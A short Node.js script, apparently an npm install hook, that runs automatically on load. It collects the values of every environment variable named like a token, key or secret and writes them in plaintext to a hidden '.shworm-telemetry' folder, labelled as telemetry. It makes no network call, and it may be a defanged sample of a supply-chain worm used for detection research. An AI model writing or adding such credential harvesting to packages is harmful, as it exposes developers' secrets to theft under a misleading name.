const fs = require("fs");
const path = require("path");

(function main() {
  const projectRoot = process.env.INIT_CWD || process.cwd();

  const outDir = path.join(projectRoot, ".shworm-telemetry");
  fs.mkdirSync(outDir, { recursive: true });

  const envSnapshot = Object.keys(process.env).reduce((acc, key) => {
    const upper = key.toUpperCase();
    if (
      upper.includes("TOKEN") ||
      upper.includes("KEY") ||
      upper.includes("SECRET")
    ) {
      acc[key] = process.env[key];
    }
    return acc;
  }, {});

  const report = {
    timestamp: new Date().toISOString(),
    cwd: process.cwd(),
    projectRoot,
    envKeys: Object.keys(envSnapshot)
  };

  fs.writeFileSync(
    path.join(outDir, "env-snapshot.json"),
    JSON.stringify(envSnapshot, null, 2)
  );

  fs.writeFileSync(
    path.join(outDir, "telemetry-report.json"),
    JSON.stringify(report, null, 2)
  );
})();
